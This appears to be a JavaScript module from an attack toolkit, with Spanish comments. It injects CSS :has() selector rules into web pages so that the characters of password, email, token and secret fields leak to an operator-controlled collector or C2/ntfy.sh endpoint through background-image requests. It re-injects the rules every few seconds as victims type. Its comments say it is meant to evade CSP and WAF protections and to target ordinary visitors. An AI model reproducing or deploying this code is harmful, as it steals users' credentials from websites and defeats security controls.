/* m-css-exfil.js — CSS exfiltration sin JS (anti-CSP/WAF). Exfil char-by-char de inputs sensibles
   vía :has(input[value$="x"]) + background-image:url(collector?c=x). Funciona donde CSP bloquea fetch/scripts.
   Collector: configurable (CSS_COLL). Para visitantes comunes usar un collector https público del operador. */
(function(G){
if(!G)return; if(G._M&&G._M.cssx)return; G._M=G._M||{}; G._M.cssx=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var OFF=window.__GE_OFF__||{};
var COLL=OFF.C&&OFF.C.C2_BASE?OFF.C.C2_BASE+'/c/':(OFF.C&&OFF.C.NTFY?OFF.C.NTFY.replace('ntfy.sh/','ntfy.sh/')+'/cssx/':'');
if(!COLL){exfil('css-exfil',{available:false,note:'sin collector CSS_COLL configurado'});return}
var FLD='input[type=password],input[name*=password i],input[name*=email i],input[type=email],input[name*=token i],input[name*=secret i]';
var CHARS='abcdefghijklmnopqrstuvwxyz0123456789@.+-_';
var idx=0;
function genCSS(){
var targets=document.querySelectorAll(FLD);
if(!targets.length)return '';
var rules='';
var fieldSel=[];
targets.forEach(function(el,i){
if(!el.id&&!el.name)return;
var s=el.id?'#'+CSS.escape(el.id):'input[name="'+CSS.escape(el.name)+'"]';
fieldSel.push(s);
});
var sel=fieldSel.join(',');
if(!sel)return '';
for(var c=0;c<CHARS.length;c++){
var ch=CHARS[c];
var enc=encodeURIComponent(ch);
// :has(selector[value$="c"]) → dispara request cuando el valor termina en ese char
rules+='body:has('+sel+'[value$="'+ch+'"]){background-image:url("'+COLL+enc+'?v=end_'+idx+'");background-size:0}\n';
}
return rules;
}
function inject(){
var css=genCSS();
if(!css)return;
var st=document.createElement('style');
st.setAttribute('data-ge-cssx','1');
st.textContent=css;
(document.head||document.documentElement).appendChild(st);
}
setTimeout(inject,2000);
// re-inyectar cada 5s para capturar valores a medida que el usuario tipea (idx rota para distinguir posiciones)
setInterval(function(){idx++;var old=document.querySelector('style[data-ge-cssx]');if(old)old.remove();inject();},5000);
exfil('css-exfil-boot',{collector:COLL,note:'char-by-char exfil anti-CSP activo'});
}catch(e){hx('m-cssx-err',{m:e.message})}
})(window.__GE__);
